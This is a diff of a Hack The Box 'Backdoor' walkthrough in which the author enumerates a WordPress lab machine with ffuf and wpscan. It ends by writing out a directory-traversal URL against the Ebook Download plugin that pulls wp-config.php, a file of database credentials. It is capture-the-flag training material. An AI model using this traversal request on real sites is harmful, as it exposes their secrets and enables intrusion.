@@ -118,14 +118,15 @@ ff02::2 ip6-allrouters
 10.200.84.200 thomaswreath.thm
 10.10.11.125 backdoor.htb
 ```
-Now, lets navigate to ```http://backdoor.htb``` 
+Now, lets navigate to ```http://backdoor.htb``` , cicking on the home button takes us back to the main page loo
+
 Lets go ahead and fuzz for directories using ffuf 
 
->command: ffuf -u "http://10.10.11.125/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup
+>command: ffuf -u "http://backdoor.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup
 
 ```
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/backdoor]
-└─$ ffuf -u "http://10.10.11.125/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup
+└─$ ffuf -u "http://backdoor.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -138,7 +139,7 @@ Lets go ahead and fuzz for directories using ffuf
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.10.11.125/FUZZ
+ :: URL              : http://backdoor.htb/FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
  :: Extensions       : .zip .sql .php .phtml .bak .backup 
  :: Follow redirects : false
@@ -169,15 +170,137 @@ xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 50
 ```
 Since we know the webpage is running on wordpress, lets use the wpscan tool to enumerate the webpage for users, themes and plugins
 
+>command: wpscan --url http://backdoor.htb/ --enumerate p --enumerate t --enumerate u 
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/backdoor]
+└─$ wpscan --url http://backdoor.htb/ --enumerate p --enumerate t --enumerate u 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://backdoor.htb/ [10.10.11.125]
+[+] Started: Mon Mar  6 03:41:50 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://backdoor.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
+ |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2022-11-02T00:00:00.000Z
+ | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 3.1
+ | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.8 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:02 <==========================================================================================> (10 / 10) 100.00% Time: 00:00:02
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://backdoor.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Mar  6 03:42:08 2023
+[+] Requests Done: 54
+[+] Cached Requests: 6
+[+] Data Sent: 13.605 KB
+[+] Data Received: 573.331 KB
+[+] Memory used: 171.109 MB
+[+] Elapsed time: 00:00:18
+```
+oops, we found no plugins. We found a username but trust me getting the password isn't possible lool.
+
+While enumerating I found something in the ```/wp-content/plugins``` directory. Lets navigate there
+
+![image](https://user-images.githubusercontent.com/67879936/223008583-8bb171b5-f45c-4fa5-8937-7859b2c83aad.png)
+
+![image](https://user-images.githubusercontent.com/67879936/223009199-ce194595-a30b-4955-9d2b-fd6a6f48ef41.png)
+
+Reading the _readme.txt_ file I found a plugin ```Ebook 1.1```. Checking for available exploits I found one
+
+![image](https://user-images.githubusercontent.com/67879936/223009432-743be987-3cf6-4b59-a472-e93045e886a7.png)
+
+As we can see that version is vulnerable to directory transversal. Lets go ahead and exploit this vulnerability
 
 
 
 
+<h2>Exploitation</h2>
 
+Link to Exploit:https://www.exploit-db.com/exploits/39575
 
+Reading the Poc of this exploi, I found this
 
+![image](https://user-images.githubusercontent.com/67879936/223010517-754e631c-4d40-4d41-9258-100209fc30a1.png)
 
+so we'll navigate to that directory to confirm if we can read the ```wp-config.php``` file.
 
+Link:http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+
+Going to that link should download the ```wp_config.php``` file to your machine
 
 
 
